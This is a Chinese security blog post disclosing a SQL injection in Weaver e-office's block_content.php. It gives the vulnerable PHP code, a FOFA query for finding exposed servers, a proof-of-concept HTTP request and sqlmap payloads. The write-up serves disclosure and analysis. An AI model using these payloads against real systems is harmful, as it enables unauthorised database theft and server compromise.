---
title: "泛微e-office block_content.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-new_mytable-block_content-sqli.html
asset_dir: assets/泛微e-office-block_content.php-sql注入漏洞
---

# 泛微e-office block\_content.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/13 18:21
- 1481浏览
- [0评论](#comment)
- 18分钟阅读

深入探索

脚本语言

应用程序

安全

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office block\_content.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/new\_mytable/block\_content.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
$nothingdata = $_lang['index_no_data'];
$block_id = $_REQUEST['block_id'];
$query = "\r\n\t\tSELECT BLOCK_TYPE FROM `index_block` WHERE BLOCK_ID={$block_id}  \r\n\t\t";
$rc = exequery( $connection, $query );
$row = mysql_fetch_array( $rc );
$block_type = $row['BLOCK_TYPE'];
include_once( "general/new_mytable/content_list/content_".$block_type.".php" );
?>
```

`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/new_mytable/block_content.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d50686268596d52564d654b6175746d52476b5a716c65567a52416b787a556a42,0x716a767171)-- -
```

[![泛微e-office block_content.php sql注入漏洞](images/img-001-6ed7230dbf88.webp)](https://image.mrxn.net/56d87a1fe15841b9974e55515177313b.webp)

成功在响应回显测试payload

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: block_id=(SELECT (CASE WHEN (7092=7092) THEN 1 ELSE (SELECT 2050 UNION SELECT 8463) END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: block_id=1 AND 1181=BENCHMARK(4000000,MD5(0x76704871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: block_id=1 UNION ALL SELECT CONCAT(0x7162707a71,0x6572537871644b6d50686268596d52564d654b6175746d52476b5a716c65567a52416b787a556a42,0x716a767171)-- -
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
